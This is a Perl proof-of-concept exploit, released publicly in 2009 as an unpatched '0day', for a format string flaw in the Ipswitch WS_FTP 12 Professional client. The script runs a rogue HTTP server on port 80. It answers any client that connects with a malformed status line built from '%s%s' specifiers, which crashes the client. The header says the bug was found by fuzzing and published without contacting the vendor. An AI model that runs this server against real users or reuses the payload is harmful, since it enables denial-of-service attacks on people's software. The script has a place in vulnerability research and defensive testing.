#!/usr/bin/perl
# nocoolnameforawsftppoc.pl
# AKA
# Ipswitch WS_FTP 12 Professional Remote Format String 0day PoC
#
# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 09.07.2009
#
# *********************************************************************************************************
# I really _hate_ releasing proof of concepts. ASCII gets itchy after a few months. And it has been over a
# year since a WS_FTP exploit/PoC has been on milw0rm (as far as I know) (!). Crazy right? This bug was
# found with Hzzp, yes WS_FTP parses HTTP too. Format string in the status code, bang bang. But the problem
# is we can't seem to be able to use %n, which I believe is disabled by default per Microsoft, making
# exploitation more difficult. Hrm. And where is a security contact for Ipswitch? I believe I did try to
# find a reasonable resource. Maybe Ipswitch should just fuzz their products with Hzzp? xD Happy Holidays!
# **********************************************************************************************************
# nocoolnameforawsftppoc.pl

use IO::Socket;

$port    = 80;
$payload = "HTTP/1.1 %s%s\r\n\r\n";

$serv = IO::Socket::INET->new(Proto=>'tcp', LocalPort=>$port, Listen=>1) or die "Error: listen($port)\n";

$cli = $serv->accept() or die "Error: accept()\n";

$cli->recv($buf, 512);
$cli->send($payload);

close($cli);
close($serv);
